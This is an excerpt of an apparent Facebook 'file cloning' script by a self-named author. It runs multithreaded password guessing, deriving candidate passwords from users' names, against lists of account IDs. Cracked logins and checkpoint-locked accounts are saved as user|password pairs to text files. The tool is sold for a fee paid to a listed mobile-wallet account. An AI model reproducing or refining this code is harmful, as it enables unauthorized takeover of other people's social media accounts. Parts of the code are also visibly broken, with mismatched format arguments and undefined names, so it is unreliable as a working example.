...
\033[0;93m★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★ ★★★★★★★★★★★★★★★
\033[0;91mAUTHOR : : SOUMIK
 
\033[0;93mFACEBOOK : : soumik956
 
\033[0;96mGITHUB : : SAS-007
 
\033[0;95mTOOLS   : : FILE CLONING (only)
\033[0;96m★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★ ★★★★★★★★★★★★★★★"""                     
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n \x1b[1;92mTOTAL OK : \x1b[1;92m %s  \x1b[1;92mSOUMIK_OK.txt' % (H, P, str(len(ok))))
	    print(' \x1b[1;91mTOTAL CP :\x1b[1;91m   %s \x1b[1;91mSOUMIK_CP.txt' % (H, P, str(len(cp))))
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r\x1b[1;92m[Soumik] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H}[Soumik-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('Soumik_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s[Soumik-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('Soumik_CP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: # BANLADESHI BRAND BRO
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
            ...
            print(50*"-")
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: # It's Banladeshi brand bro.
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
...
def bnsbuy():
    ...
    if to in r:
        ...
        print
        print('\rTool Price 200Tk\n')
        print
        print('\rjazzcash Account Number 01773147714\n')
        print('\rAccount Name Soumik Ahmed\n')
        print
        print
...
def bnsreg():
    ...
    print
    id = str(uuid.uuid1(uuid.getnode(),0))[24:].upper() + "~SAS=="
    print
